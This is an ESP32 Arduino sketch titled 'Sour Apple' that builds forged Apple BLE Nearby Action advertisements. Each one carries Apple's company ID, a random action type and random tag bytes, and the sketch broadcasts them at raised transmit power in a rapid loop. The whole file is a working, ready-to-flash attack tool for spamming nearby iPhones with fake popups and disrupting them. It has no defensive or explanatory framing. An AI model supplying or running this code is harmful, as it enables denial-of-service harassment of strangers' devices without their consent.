// ESP32 Sour Apple by RapierXbox


#include <NimBLEDevice.h>

NimBLEAdvertising *pAdvertising;

void setup() {
  NimBLEDevice::init("");

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9); //This should increase transmitting power to 9dBm
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9); //Not sure if this works with NimBLE
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN ,ESP_PWR_LVL_P9);

  NimBLEServer *pServer = NimBLEDevice::createServer();

  pAdvertising = pServer->getAdvertising();
}

NimBLEAdvertisementData getOAdvertisementData() {
  NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
  uint8_t packet[17];
  uint8_t i = 0;

  packet[i++] = 16;    // Packet Length
  packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;        // ...
  packet[i++] = 0x0F;  // Type
  packet[i++] = 0x05;                        // Length
  packet[i++] = 0xC1;                        // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];  // Action Type
  esp_fill_random(&packet[i], 3); // Authentication Tag
  i += 3;   
  packet[i++] = 0x00;  // ???
  packet[i++] = 0x00;  // ???
  packet[i++] =  0x10;  // Type ???
  esp_fill_random(&packet[i], 3);

  randomAdvertisementData.addData(std::string((char *)packet, 17));
  return randomAdvertisementData;
}

void loop() {
  delay(40);
  NimBLEAdvertisementData advertisementData = getOAdvertisementData();
  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->start();
  delay(20);
  pAdvertising->stop();
}
